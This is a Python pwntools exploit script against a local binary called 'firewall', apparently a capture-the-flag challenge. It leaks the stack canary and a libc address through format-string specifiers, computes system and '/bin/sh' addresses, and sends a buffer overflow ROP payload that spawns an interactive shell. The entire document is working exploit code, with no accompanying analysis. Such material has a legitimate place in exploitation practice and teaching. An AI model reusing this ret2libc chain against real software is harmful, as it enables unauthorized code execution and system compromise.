from pwn import *

elf = ELF('./firewall')

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

rop = ROP(libc)

p = process('./firewall')

fmt_str_leak_canary = '%41$llp'

# leak return address of main ->  <__libc_start_main+234>
fmt_str_leak_base_addr = '%43$llp'

p.recv()
p.sendline(fmt_str_leak_base_addr)

p.recvuntil('[x]~> ')
addr_base = p.recvline()

addr_base = int(addr_base.strip(), 16) - 234

print("Leak address of __libc_start_main: ", hex(addr_base))

offset_addr = addr_base - libc.symbols['__libc_start_main']

print('Offset lib: ', hex(offset_addr))

p.sendline(fmt_str_leak_canary)

p.recvuntil('[x]~> ')
canary = p.recvline()

canary = int(canary.strip(), 16)

print('Leak Canary: ', hex(canary))

# pass argument for function
pop_rdi_addr = offset_addr + rop.find_gadget(['pop rdi', 'ret'])[0]

system_addr = offset_addr + libc.symbols['system']

binsh_addr = offset_addr + list(libc.search(b'/bin/sh'))[0]


payload = b'Y'*(0x110-0x8) + p64(canary) + b'Y'*0x8 + \
    p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)

p.sendline('connect')
p.sendline('send')

p.recvuntil('[*]~> ')
p.sendline(payload)

p.interactive()
